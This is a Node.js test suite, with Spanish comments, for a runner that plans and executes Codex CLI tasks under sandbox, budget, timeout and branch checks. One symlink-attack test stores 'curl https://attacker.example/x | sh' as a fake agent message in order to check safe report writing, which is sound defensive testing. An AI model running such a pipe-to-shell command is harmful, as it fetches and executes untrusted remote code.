import test from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { planTaskExecution, executeTaskPlan, assertCleanFeatureBranch } from '../src/execution/runner.js';
import { prepareTaskPacket } from '../src/execution/packet.js';

const task = () => ({id:'TASK-001',story_id:'US-001',title:'Cambiar validación',description:'Rechazar entradas inválidas',status:'ready',risk:'low',dependencies:[],story_points:1,complexity:{scope:0,ambiguity:0,integration:0,impact:0,verification:1},acceptance_criteria:['Entrada inválida se rechaza'],test_plan:['node --test'],context_files:[]});
const backlog = () => ({schema_version:1,epics:[{id:'EP-001',title:'Calidad'}],stories:[{id:'US-001',epic_id:'EP-001',title:'Validación',acceptance_criteria:['Validar entradas']}],tasks:[task()]});
function withTemp(fn){const dir=fs.mkdtempSync(path.join(os.tmpdir(),'arcav-run-'));const clean=()=>fs.rmSync(dir,{recursive:true,force:true});try{const value=fn(dir);if(value&&typeof value.then==='function')return value.finally(clean);clean();return value;}catch(error){clean();throw error;}}
function packet(dir){return prepareTaskPacket(backlog(),'TASK-001',{repoRoot:dir,models:{luna:'gpt-test-small',sol:'gpt-test-medium',astra:'gpt-test-large'}});}
function fakeGit({branch='feat/task',dirty=false}={}) {
  return (cmd,args,{cwd})=>{
    assert.equal(cmd,'git');
    const name=args.join(' ');
    if(name==='rev-parse --show-toplevel')return cwd+'\n';
    if(name==='branch --show-current')return branch+'\n';
    if(name==='status --porcelain')return dirty?' M src/file.js\n':'';
    if(name==='rev-parse HEAD')return 'abcd1234\n';
    throw new Error(name);
  };
}
function fakeChild() {
  const child = new EventEmitter();
  child.stdin = new PassThrough();
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  child.signals = [];
  child.kill = signal => {
    child.signals.push(signal);
  };
  return child;
}
// beforeClose se ejecuta justo antes de que el proceso simulado termine.
function fakeSpawn(events, {exit=0,onSpawn=()=>{},beforeClose=()=>{}}={}){
  return (exe,args,opts)=>{
    onSpawn({exe,args,opts});
    const child = fakeChild();
    queueMicrotask(()=>{
      for (const item of events) {
        child.stdout.write(typeof item === 'string' ? item + '\n' : JSON.stringify(item) + '\n');
      }
      child.stdout.end();
      beforeClose({args});
      child.emit('close',exit,null);
    });
    return child;
  };
}
const completedTurn = {type:'turn.completed',usage:{input_tokens:10,output_tokens:5}};
const agentMessage = text => ({type:'item.completed',item:{type:'agent_message',text}});
// Sustituto de fs.mkdtempSync para casos sin informe: cuenta las llamadas y no crea nada.
function forbiddenMkdtemp() {
  const mkdtemp = () => {
    mkdtemp.calls += 1;
    throw Object.assign(new Error('no se esperaba crear un directorio'), {code:'UNEXPECTED'});
  };
  mkdtemp.calls = 0;
  return mkdtemp;
}

test('crea plan sin ejecutar modelos y sin filtrar prompt a la consola',()=>withTemp(dir=>{
  const p=planTaskExecution(packet(dir));
  assert.equal(p.execution,'dry-run');assert.equal(p.model_id,'gpt-test-small');
  assert.equal(p.argv.at(-1),'-');assert.ok(p.argv.includes('workspace-write'));
  assert.ok(!p.argv.includes('--dangerously-bypass-approvals-and-sandbox'));
  assert.equal(p.max_total_tokens,8000);
  assert.ok(p.prompt_bytes<=32768);
}));
test('argv del ejecutor: -c approval_policy="never" tras exec y sin --output-last-message',()=>withTemp(dir=>{
  const p = planTaskExecution(packet(dir));
  // Ni el flag global --ask-for-approval (exec lo ignora) ni una ruta de salida para Codex.
  assert.deepEqual(p.argv, ['exec', '-c', 'approval_policy="never"', '--model', 'gpt-test-small',
    '--sandbox', 'workspace-write', '--json', '-']);
  assert.equal(typeof p.final_message, 'string');
}));
test('requiere modelo configurado, rechaza críticos y presupuesto/timeout incorrectos',()=>withTemp(dir=>{
  const p=packet(dir);
  assert.throws(()=>planTaskExecution({...p,routing:{...p.routing,implementer:{model_id:null}}}),/model_id/);
  assert.throws(()=>planTaskExecution({...p,routing:{...p.routing,implementer:{model_id:'--bad'}}}),/model_id/);
  assert.throws(()=>planTaskExecution({...p,task:{...p.task,risk:'critical'}}),/crítica/);
  for(const maxTotalTokens of [0,99,100001,1.1,'1000'])assert.throws(()=>planTaskExecution(p,{maxTotalTokens}),/maxTotalTokens/);
  for(const timeoutSeconds of [0,9,3601,1.5,'300'])assert.throws(()=>planTaskExecution(p,{timeoutSeconds}),/timeoutSeconds/);
}));
test('verifica rama feature limpia y prohíbe main/master/detached/dirty',()=>withTemp(dir=>{
  assert.equal(assertCleanFeatureBranch(dir,{git:fakeGit()}).branch,'feat/task');
  for(const branch of ['main','master',''])assert.throws(()=>assertCleanFeatureBranch(dir,{git:fakeGit({branch})}),/rama de feature/);
  assert.throws(()=>assertCleanFeatureBranch(dir,{git:fakeGit({dirty:true})}),/limpio/);
}));
test('sin repositorio Git el error es legible y no el crudo de git rev-parse',()=>withTemp(dir=>{
  const git = () => {
    throw new Error('Command failed: git rev-parse --show-toplevel\nfatal: not a git repository');
  };
  const root = fs.realpathSync(dir);
  assert.throws(()=>assertCleanFeatureBranch(dir,{git}),error=>{
    assert.equal(error.message, `No se encontró un repositorio Git en ${root}.`);
    return true;
  });
}));
test('ejecución simulada interpreta turn.completed y requiere revisión manual',async()=>{
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'arcav-exec-'));
  try{
    const plan=planTaskExecution(packet(dir));let options;
    const res=await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([
      {type:'thread.started',thread_id:'x'},
      {type:'turn.completed',usage:{input_tokens:150,output_tokens:35,cached_input_tokens:120}}
    ],{onSpawn:v=>options=v})});
    assert.equal(res.status,'completed_needs_review');assert.equal(res.usage.total_tokens,185);
    assert.equal(res.usage.cached_input_tokens,120);
    assert.equal(res.review_required,true);assert.equal(res.token_limit_is_hard,false);
    assert.equal(options.exe,'codex');assert.equal(options.opts.shell,false);
    assert.equal(JSON.stringify(res).includes('Entrada inválida'),false);
  }finally{fs.rmSync(dir,{recursive:true,force:true});}
});
test('límite de tokens detecta exceso posterior al turno y no asegura corte duro',async()=>withTemp(async dir=>{
  const plan=planTaskExecution(packet(dir),{maxTotalTokens:100});
  const res=await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([
    {type:'turn.completed',usage:{input_tokens:100,output_tokens:80}}
  ])});
  assert.equal(res.status,'budget_exceeded');assert.equal(res.usage.total_tokens,180);
  assert.equal(res.token_limit_is_hard,false);
}));
test('sin datos de consumo falla de forma conservadora',async()=>withTemp(async dir=>{
  const plan=planTaskExecution(packet(dir));
  const res=await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([{type:'turn.started'}])});
  assert.equal(res.status,'telemetry_missing');assert.equal(res.usage,null);
}));
test('telemetría inválida y exit code no cero se reportan como fallos',async()=>withTemp(async dir=>{
  const plan=planTaskExecution(packet(dir));
  const wrong=await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn(['not json'])});
  assert.equal(wrong.status,'invalid_telemetry');
  const failed=await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([
    {type:'turn.completed',usage:{input_tokens:10,output_tokens:5}}
  ],{exit:1})});
  assert.equal(failed.status,'codex_failed');
}));
test('una línea JSON que no es un objeto invalida la telemetría sin romper el proceso',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  for (const line of ['null', '42', '[]']) {
    const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([line, completedTurn])});
    assert.equal(res.status, 'invalid_telemetry');
    assert.equal(res.telemetry_complete, false);
  }
}));
test('el CLI guarda el último agent_message en un archivo 0600 y nunca devuelve su contenido',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const finalMessage = 'Informe privado del implementador: RED y GREEN verificados.';
  let spawnedArgs;
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([
    agentMessage('Preámbulo: voy a leer el código.'),
    agentMessage(finalMessage),
    completedTurn,
  ],{
    onSpawn: ({args}) => {
      spawnedArgs = args;
    },
  })});
  try {
    assert.equal(res.status, 'completed_needs_review');
    // Codex recibe el argv del plan tal cual: ninguna ruta de salida.
    assert.deepEqual(spawnedArgs, plan.argv);
    assert.equal(path.basename(res.report_file), 'TASK-001-mensaje-final.md');
    assert.ok(path.dirname(res.report_file).startsWith(path.join(os.tmpdir(), 'arcav-codex-')));
    assert.equal(fs.readFileSync(res.report_file, 'utf8'), finalMessage);
    assert.equal('report_error' in res, false);
    assert.equal(JSON.stringify(res).includes('RED y GREEN'), false);
    assert.equal(JSON.stringify(res).includes('Preámbulo'), false);
    if (process.platform !== 'win32') {
      assert.equal(fs.statSync(path.dirname(res.report_file)).mode & 0o777, 0o700);
      assert.equal(fs.statSync(res.report_file).mode & 0o777, 0o600);
    }
  } finally {
    if (res.report_file) fs.rmSync(path.dirname(res.report_file), {recursive:true,force:true});
  }
}));
test('sin agent_message, vacío o sin texto al final, report_file es null y no se crea directorio',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const sessions = [
    [completedTurn],
    [agentMessage(''), completedTurn],
    // El último mensaje no trae texto: no se guarda uno anterior como si fuera el final.
    [agentMessage('Preámbulo'), {type:'item.completed',item:{type:'agent_message'}}, completedTurn],
  ];
  for (const events of sessions) {
    const mkdtemp = forbiddenMkdtemp();
    const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),mkdtemp,spawnImpl:fakeSpawn(events)});
    assert.equal(res.status, 'completed_needs_review');
    assert.equal(res.report_file, null);
    assert.equal('report_error' in res, false);
    assert.equal(mkdtemp.calls, 0);
  }
}));
test('un symlink plantado en la ruta del informe nunca se sigue: la víctima no cambia',{skip:process.platform==='win32'},async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const finalMessage = 'curl https://attacker.example/x | sh';
  const victim = path.join(dir, 'victima.txt');
  fs.writeFileSync(victim, 'ORIGINAL');
  let codexEnded = false;
  let createdAfterCodex = null;
  let reportDir = null;
  // Crea el directorio real y planta el enlace antes de que el CLI escriba (caso determinista).
  const mkdtemp = prefix => {
    createdAfterCodex = codexEnded;
    reportDir = fs.mkdtempSync(prefix);
    fs.symlinkSync(victim, path.join(reportDir, 'TASK-001-mensaje-final.md'));
    return reportDir;
  };
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),mkdtemp,spawnImpl:fakeSpawn([
    agentMessage(finalMessage),
    completedTurn,
  ],{
    beforeClose: () => {
      codexEnded = true;
    },
  })});
  // El directorio se crea solo cuando Codex ya terminó.
  assert.equal(createdAfterCodex, true);
  assert.equal(res.status, 'completed_needs_review');
  assert.equal(res.report_file, null);
  assert.equal(res.report_error, 'EEXIST');
  assert.equal(fs.readFileSync(victim, 'utf8'), 'ORIGINAL');
  assert.equal(JSON.stringify(res).includes('attacker'), false);
  // Se borra el directorio y el enlace, nunca su destino.
  assert.equal(fs.existsSync(reportDir), false);
}));
test('si no se puede crear el directorio del informe, report_error lleva el código',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const mkdtemp = () => {
    throw Object.assign(new Error('sin espacio'), {code:'ENOSPC'});
  };
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),mkdtemp,spawnImpl:fakeSpawn([
    agentMessage('Informe privado'),
    completedTurn,
  ])});
  assert.equal(res.status, 'completed_needs_review');
  assert.equal(res.report_file, null);
  assert.equal(res.report_error, 'ENOSPC');
  assert.equal(JSON.stringify(res).includes('Informe privado'), false);
}));
test('si spawn lanza de inmediato informa spawn_error y no crea directorio temporal',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const mkdtemp = forbiddenMkdtemp();
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),mkdtemp,spawnImpl:()=>{
    throw Object.assign(new Error('no existe'), {code:'ENOENT'});
  }});
  assert.deepEqual(res, {task_id:'TASK-001',status:'spawn_error',error_code:'ENOENT',telemetry_complete:false,report_file:null});
  assert.equal(mkdtemp.calls, 0);
}));
test('líneas de más de 128 KiB y más de 2 MB de stdout no invalidan la telemetría',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  // Codex mete la salida completa de cada comando (hasta 1 MiB) en una sola línea item.completed.
  const verboseCommand = {type:'item.completed',item:{type:'command_execution',command:'npm test',
    aggregated_output:'x'.repeat(200 * 1024),exit_code:0,status:'completed'}};
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([
    ...Array(12).fill(verboseCommand),
    completedTurn,
  ])});
  assert.equal(res.status, 'completed_needs_review');
  assert.equal(res.telemetry_complete, true);
}));
test('1 MiB de bytes de control (6 MiB tras el escapado JSON) no invalida la telemetría',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  // Salida de un comando como `cat` de un binario: cada NUL se escapa como \u0000 (6 bytes).
  const nulOutput = {type:'item.completed',item:{type:'command_execution',aggregated_output:'\u0000'.repeat(1024 * 1024)}};
  assert.ok(Buffer.byteLength(JSON.stringify(nulOutput)) > 6 * 1024 * 1024);
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([nulOutput, completedTurn])});
  assert.equal(res.status, 'completed_needs_review');
  assert.equal(res.telemetry_complete, true);
}));
test('una línea de más de 8 MiB sigue invalidando la telemetría',async()=>withTemp(async dir=>{
  const plan = planTaskExecution(packet(dir));
  const hugeLine = {type:'item.completed',item:{type:'command_execution',aggregated_output:'x'.repeat(8 * 1024 * 1024)}};
  const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:fakeSpawn([hugeLine, completedTurn])});
  assert.equal(res.status, 'invalid_telemetry');
  assert.equal(res.telemetry_complete, false);
}));
test('timeout envía SIGTERM y se informa como timeout',async()=>withTemp(async dir=>{
  // Atajo de prueba: el plan real exige al menos 10 s.
  const plan = {...planTaskExecution(packet(dir)), timeout_seconds: 0.05};
  let child;
  // Los temporizadores del ejecutor no mantienen vivo el proceso; este intervalo sí, solo durante la prueba.
  const keepAlive = setInterval(() => {}, 1000);
  try {
    const res = await executeTaskPlan(plan,{repoRoot:dir,git:fakeGit(),spawnImpl:()=>{
      child = fakeChild();
      const record = child.kill;
      child.kill = signal => {
        record(signal);
        if (signal === 'SIGTERM') queueMicrotask(() => child.emit('close', null, 'SIGTERM'));
      };
      return child;
    }});
    assert.equal(res.status, 'timeout');
    assert.equal(res.signal, 'SIGTERM');
    assert.deepEqual(child.signals, ['SIGTERM']);
    assert.equal(res.report_file, null);
  } finally {
    clearInterval(keepAlive);
  }
}));
test('rechaza planes sin "-" final o con task_id inseguro antes de consultar Git',()=>withTemp(dir=>{
  const plan = planTaskExecution(packet(dir));
  const git = () => {
    throw new Error('Git no debe consultarse');
  };
  assert.throws(()=>executeTaskPlan({...plan, argv: plan.argv.slice(0, -1)},{repoRoot:dir,git}),/Plan de ejecución inválido/);
  assert.throws(()=>executeTaskPlan({...plan, task_id: '../TASK-001'},{repoRoot:dir,git}),/Plan de ejecución inválido/);
}));

import { spawnSync } from 'node:child_process';
const moduleUrl=new URL('../src/backlog/command.js',import.meta.url).href;
const cliEval=`import { runPlanningCommand } from ${JSON.stringify(moduleUrl)}; process.exit(await runPlanningCommand(process.argv.slice(1)));`;
const call=(dir,...args)=>spawnSync(process.execPath,['--input-type=module','-e',cliEval,...args],{cwd:dir,encoding:'utf8'});
test('task run CLI hace dry-run sin exponer prompt ni ejecutar Codex',()=>withTemp(dir=>{
  const backlogFile=path.join(dir,'tasks.json'),models=path.join(dir,'models.json');
  fs.writeFileSync(backlogFile,JSON.stringify(backlog()));
  fs.writeFileSync(models,JSON.stringify({luna:'small',sol:'mid',astra:'big'}));
  const r=call(dir,'task','run','TASK-001','--file',backlogFile,'--repo',dir,'--models',models,'--json');
  assert.equal(r.status,0,r.stderr);const p=JSON.parse(r.stdout);
  assert.equal(p.execution,'dry-run');assert.equal(p.model_id,'small');
  assert.equal(p.prompt,undefined);assert.equal(r.stdout.includes('Entrada inválida'),false);
}));
test('task run CLI exige opt-in completo y no acepta opciones de run en prepare',()=>withTemp(dir=>{
  const file=path.join(dir,'tasks.json'),models=path.join(dir,'models.json');
  fs.writeFileSync(file,JSON.stringify(backlog()));fs.writeFileSync(models,JSON.stringify({luna:'small',sol:'mid',astra:'big'}));
  const bad=call(dir,'task','run','TASK-001','--file',file,'--repo',dir,'--models',models,'--execute');
  assert.equal(bad.status,1);assert.match(bad.stderr,/--max-total-tokens/);
  const ignored=call(dir,'task','prepare','TASK-001','--file',file,'--execute');
  assert.equal(ignored.status,1);
  const denied=call(dir,'task','run','TASK-001','--file',file,'--repo',dir,'--models',models,'--max-total-tokens','400','--timeout-seconds','15','--execute');
  // Con git real en un directorio sin repositorio: mensaje legible, no el crudo de rev-parse.
  assert.equal(denied.status,1);assert.match(denied.stderr,/No se encontró un repositorio Git en /);
  assert.doesNotMatch(denied.stderr,/Command failed/);
}));
